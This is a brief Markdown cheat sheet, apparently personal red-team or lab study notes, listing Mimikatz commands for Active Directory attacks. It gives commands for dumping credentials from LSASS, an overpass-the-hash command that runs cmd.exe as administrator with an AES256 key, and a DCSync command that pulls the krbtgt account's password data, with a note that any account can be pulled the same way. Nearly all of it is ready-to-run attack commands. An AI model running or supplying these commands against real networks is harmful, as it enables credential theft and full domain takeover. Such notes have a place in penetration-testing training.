---
tags:
  - Credential_Theft
  - Persistence
---
all the attacks are listed [here](https://adsecurity.org/?page_id=1821)

### Dump credentials from LSASS
```powershell
privilege::debug
sekurlsa::logonpasswords
```

---
### OPTH
```powershell
sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe
```

> [!NOTE] Note
> The above commands starts a process with a logon type 9 (same as runas/netonly)

---
### Pull password data for the KRBTGT user account in domain:  
```
lsadump::dcsync /domain:lol.local /user:krbtgt
```

> [!NOTE] Note
> You can pull out any user, computer or domain controller by changing the user switch to the desired account
